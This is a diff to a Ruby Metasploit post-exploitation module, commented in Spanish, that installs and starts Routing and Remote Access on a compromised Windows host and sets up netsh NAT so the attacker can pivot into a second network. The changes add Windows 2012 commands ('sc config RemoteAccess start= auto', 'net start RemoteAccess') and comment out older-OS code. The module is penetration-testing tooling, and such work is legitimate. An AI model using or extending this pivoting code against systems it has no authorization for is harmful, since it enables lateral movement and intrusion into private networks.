@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Post
 		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network. Explample: "eth1", "Ethernet", "tap0"...']),
       ])
   end
-	#Obtenemos el OS de instalacion de metasploit
+	# Obtenemos el OS de instalacion de metasploit
 	def sistema_base?
 		if (Msf::Config.local_directory[0,1])==("/")
 			return "linux"
@@ -108,7 +108,10 @@ class MetasploitModule < Msf::Post
 					print_status("Powershell is installed. Trying to install the services.")
 					# Ejecutar en powershell: Import-Module Servermanager ; Add-WindowsFeature NPAS-RRAS-Services
 					# En SSOO de 64 bits hay que ejecutar powershell de 64 bits para que funcione, si la shell/meterpreter es para 32 bits no funciona porque no existe el módulo ServerManager. Habría que comprobarlo en un W2008, W2012 y W2016 de 32 bits.
-					print_status(psh_exec("Get-Module -ListAvailable ; Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services"))
+					# Windows 2008
+					# print_status(psh_exec("Get-Module -ListAvailable ; Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services"))
+					# Windows 2012
+					print_status(psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing"))
 				else
 					print_bad("Powershell is not installed. Trying to install from command line...")
 					print_status(cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services"))
@@ -120,19 +123,28 @@ class MetasploitModule < Msf::Post
 			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
 			
 			print_status("	Enabling Routing and Remote Access service...")
-			if service_change_startup("RemoteAccess",2)
-				print_good("	RemoteAccess service enabled.")
-			else
-				print_bad("  	There was an error enabling RemoteAccess service.")
+			# Windows XP, 2003, 2008
+			# if service_change_startup("RemoteAccess",2)
+				# print_good("	RemoteAccess service enabled.")
+			# else
+				# print_bad("  	There was an error enabling RemoteAccess service.")
 				# Exit
-			end
+			# end
+			
+			# windows 2012
+			cmd_exec ("sc config RemoteAccess start= auto")
+						
 			print_status("	Starting Routing and Remote Access service...")
-			if service_start("RemoteAccess")
-				print_good("	RemoteAccess service started.")
-			else
-				print_bad("  	There was an error starting RemoteAccess service.")
+			# Windows XP, 2003, 2008
+			# if service_start("RemoteAccess")
+				# print_good("	RemoteAccess service started.")
+			# else
+				# print_bad("  	There was an error starting RemoteAccess service.")
 				# Exit
-			end
+			# end
+			
+			# windows 2012
+			cmd_exec("net start RemoteAccess")
 			
 			puts("")
 		else
